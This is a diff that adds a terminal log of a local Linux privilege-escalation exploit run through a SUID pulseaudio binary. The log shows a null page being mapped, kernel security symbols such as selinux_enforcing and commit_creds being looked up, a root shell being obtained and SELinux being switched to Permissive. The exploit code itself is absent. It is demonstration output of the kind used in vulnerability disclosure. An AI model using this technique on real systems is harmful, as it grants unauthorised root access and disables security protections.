@@ -1,0 +1,57 @@
+[spender@localhost ~]$ getenforce
+Enforcing
+[spender@localhost ~]$ pulseaudio -L /home/spender/exploit.so
+I: caps.c: Limited capabilities successfully to CAP_SYS_NICE.
+I: caps.c: Dropping root privileges.
+I: caps.c: Limited capabilities successfully to CAP_SYS_NICE.
+N: main.c: Called SUID root and real-time and/or high-priority 
+scheduling was requested in the configuration. However, we lack the 
+necessary privileges:
+N: main.c: We are not in group 'pulse-rt', PolicyKit refuse to grant us 
+the requested privileges and we have no increase 
+RLIMIT_NICE/RLIMIT_RTPRIO resource limits.
+N: main.c: For enabling real-time/high-priority scheduling please 
+acquire the appropriate PolicyKit privileges, or become a member of 
+'pulse-rt', or increase the RLIMIT_NICE/RLIMIT_RTPRIO resource limits 
+for this user.
+W: alsa-util.c: Device front:0 doesn't support 44100 Hz, changed to 
+44099 Hz.
+E: alsa-util.c: snd_pcm_avail_update() returned a value that is 
+exceptionally large: 270336 bytes (1532 ms) Most likely this is an ALSA 
+driver bug. Please report this issue to the PulseAudio developers.
+N: module-alsa-sink.c: Increasing wakeup watermark to 40.00 ms
+E: alsa-util.c: snd_pcm_avail_update() returned a value that is 
+exceptionally large: 270336 bytes (1532 ms) Most likely this is an ALSA 
+driver bug. Please report this issue to the PulseAudio developers.
+N: module-alsa-sink.c: Increasing wakeup watermark to 80.00 ms
+E: alsa-util.c: snd_pcm_avail_update() returned a value that is 
+exceptionally large: 270336 bytes (1532 ms) Most likely this is an ALSA 
+driver bug. Please report this issue to the PulseAudio developers.
+N: module-alsa-sink.c: Increasing wakeup watermark to 160.00 ms
+ [+] MAPPED ZERO PAGE!
+ [+] Looking up wouldnt_you_like_to_know
+E: alsa-util.c: snd_pcm_avail_update() returned a value that is 
+exceptionally large: 270336 bytes (1532 ms) Most likely this is an ALSA 
+driver bug. Please report this issue to the PulseAudio developers.
+N: module-alsa-sink.c: Increasing wakeup watermark to 320.00 ms
+N: module-alsa-sink.c: Increasing wakeup watermark to 368.53 ms
+wouldnt_you_like_to_know = 0xf7ca17a0
+ [+] Looking up selinux_enforcing
+ [+] Looking up selinux_enabled
+ [+] Looking up selinux_mls_enabled
+ [+] Looking up apparmor_enabled
+ [+] Looking up apparmor_complain
+ [+] Looking up apparmor_audit
+ [+] Looking up selinux_logsyscall
+ [+] Looking up security_ops
+ [+] Looking up default_security_ops
+ [+] Looking up commit_creds
+ [+] Looking up init_cred
+ [+] *0xf7ca17a0 |= 1
+ [+] b00m!
+ [+] AAAAAND here's your rootshell!
+sh-3.2# id
+uid=0(root) gid=0(root)
+sh-3.2# getenforce
+Permissive
+
